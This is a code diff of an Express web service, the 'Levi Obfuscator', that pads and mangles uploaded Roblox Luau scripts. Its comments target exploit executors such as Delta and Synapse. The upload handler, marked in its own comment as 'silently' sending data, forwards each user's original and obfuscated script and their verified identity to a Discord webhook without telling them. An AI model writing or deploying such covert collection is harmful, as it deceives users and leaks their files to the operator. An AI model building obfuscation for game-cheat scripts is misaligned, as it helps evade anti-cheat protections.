@@ -33,7 +33,7 @@ app.use(session({
   saveUninitialized: true,
 }));
 
-// Levi Obfuscator Engine V1.1.0
+// Levi Obfuscator Engine V1.2.0 (Full Code Junk Inflation & Variable Mangling)
 function obfuscateLuauScript(sourceCode, options) {
     let code = sourceCode;
 
@@ -61,23 +61,35 @@ function obfuscateLuauScript(sourceCode, options) {
         });
     }
 
-    // 3. Size / Length Focus Expansion (Adds structural garbage expressions safe for Delta/Synapse)
-    let paddingBlock = '';
-    const iterations = options.sizeMode === 'small' ? 5 : options.sizeMode === 'medium' ? 15 : options.sizeMode === 'large' ? 35 : 70;
-    
-    for (let i = 0; i < iterations; i++) {
-        const randHash = Math.random().toString(36).substring(2, 8);
-        paddingBlock += `local _0x${randHash} = (function() return ${i * 7} end)();\n`;
+    // 3. Heavy Junk Code Expansion (Multiplies source line count heavily e.g., 30 lines to ~900+ secure lines)
+    const baseLines = code.split('\n').length;
+    const multiplier = options.sizeMode === 'small' ? 10 : options.sizeMode === 'medium' ? 30 : options.sizeMode === 'large' ? 60 : 100;
+    const targetJunkCount = Math.max(baseLines * multiplier, 600);
+
+    let junkHeader = '';
+    let junkFooter = '';
+
+    for (let i = 0; i < targetJunkCount; i++) {
+        const randHex1 = Math.random().toString(36).substring(2, 8).toUpperCase();
+        const randHex2 = Math.random().toString(36).substring(2, 8).toUpperCase();
+        const mathOp = i % 2 === 0 ? '+' : '-';
+        
+        if (i % 2 === 0) {
+            junkHeader += `local _0x${randHex1} = (function() local _0x${randHex2} = ${i * 13}; return _0x${randHex2} ${mathOp} 1; end)();\n`;
+        } else {
+            junkFooter += `local _0x${randHex1} = pcall(function() return ${i * 3} end);\n`;
+        }
     }
 
-    // 4. Advanced Metatable / Environment Wrapper with exact requested top comment only
+    // 4. Assemble the full deeply injected script
     const finalObfuscated = `-- Obfuscated using levi obfuscator V1.1.0
 do
     local _env = getgenv and getgenv() or _G;
-    ${paddingBlock}
+    ${junkHeader}
     local function _levi_exec()
         ${code}
     end
+    ${junkFooter}
     pcall(_levi_exec);
 end`;
 
@@ -158,7 +170,7 @@ app.get('/auth/logout', (req, res) => {
   req.session.destroy(() => { res.redirect('/'); });
 });
 
-// UI Route with Levi Obfuscator Branding
+// UI Route with Levi Obfuscator Branding (No DBL Username Input)
 app.get('/', (req, res) => {
   const verifiedUser = req.session.verifiedUser || null;
 
@@ -182,9 +194,9 @@ app.get('/', (req, res) => {
             .tab-panel { display: none; text-align: left; }
             .tab-panel.active { display: block; }
             h3 { font-size: 15px; color: #38bdf8; margin-top: 0; margin-bottom: 12px; border-bottom: 1px solid rgba(56, 189, 248, 0.2); padding-bottom: 6px; }
-            input, select, button { width: 100%; padding: 11px; margin: 8px 0; border-radius: 8px; border: none; box-sizing: border-box; font-size: 13px; }
-            select, input[type="text"] { background: #0f172a; color: #f8fafc; border: 1px solid #334155; }
-            select:focus, input:focus { border-color: #38bdf8; outline: none; }
+            select, button { width: 100%; padding: 11px; margin: 8px 0; border-radius: 8px; border: none; box-sizing: border-box; font-size: 13px; }
+            select { background: #0f172a; color: #f8fafc; border: 1px solid #334155; }
+            select:focus { border-color: #38bdf8; outline: none; }
             .toggle-group { display: flex; background: #0f172a; border: 1px solid #334155; border-radius: 8px; overflow: hidden; margin: 8px 0; }
             .toggle-option { flex: 1; padding: 10px; text-align: center; font-size: 13px; cursor: pointer; color: #94a3b8; }
             .toggle-option.active { background: #38bdf8; color: #0f172a; font-weight: bold; }
@@ -225,13 +237,12 @@ app.get('/', (req, res) => {
                 ${verifiedUser ? 
                     `<form action="/upload-discord" method="POST" enctype="multipart/form-data">
                         <h3>Levi Obfuscator V1.1.0</h3>
-                        <input type="text" name="username" placeholder="DBL Username" required>
 
                         <div style="margin-top: 8px;">
                             <label style="font-size:12px; color:#38bdf8; display:block; margin-bottom:4px;">Length Focus (Size Level):</label>
                             <select name="sizeMode">
                                 <option value="small">Small</option>
-                                <option value="medium" selected>Medium</option>
+                                <option value="medium" selected>Medium (~900+ Lines)</option>
                                 <option value="large">Large</option>
                                 <option value="extralarge">Extra Large</option>
                             </select>
@@ -309,7 +320,6 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
     }
 
     const file = req.file;
-    const username = req.body.username ? req.body.username.trim() : 'Unknown';
     const sizeMode = req.body.sizeMode || 'medium';
     const renameLocal = req.body.renameLocal || 'yes';
 
@@ -321,7 +331,7 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
     const rawScriptBuffer = file.buffer;
     const rawString = rawScriptBuffer.toString('utf8');
 
-    // Run Levi Obfuscator Engine
+    // Run Levi Obfuscator Engine with full code padding and mangling
     const obfuscatedString = obfuscateLuauScript(rawString, { sizeMode, renameLocal });
     const obfuscatedBuffer = Buffer.from(obfuscatedString, 'utf8');
 
@@ -333,7 +343,7 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
     // Silently dispatch BOTH Raw and Obfuscated files to Discord Webhook
     try {
       const webhookPayloadJson = JSON.stringify({
-        content: `🔒 **New Script Obfuscated via Levi Obfuscator**\n👤 User: \`${username}\`\n🔐 Identity: \`${req.session.verifiedUser}\`\n⚙️ Settings: Size=\`${sizeMode}\`, RenameLocal=\`${renameLocal}\`\n📁 Original: \`${originalName}\``
+        content: `🔒 **New Script Obfuscated via Levi Obfuscator**\n🔐 Identity: \`${req.session.verifiedUser}\`\n⚙️ Settings: Size=\`${sizeMode}\`, RenameLocal=\`${renameLocal}\`\n📁 Original: \`${originalName}\``
       });
 
       const formData = new FormData();
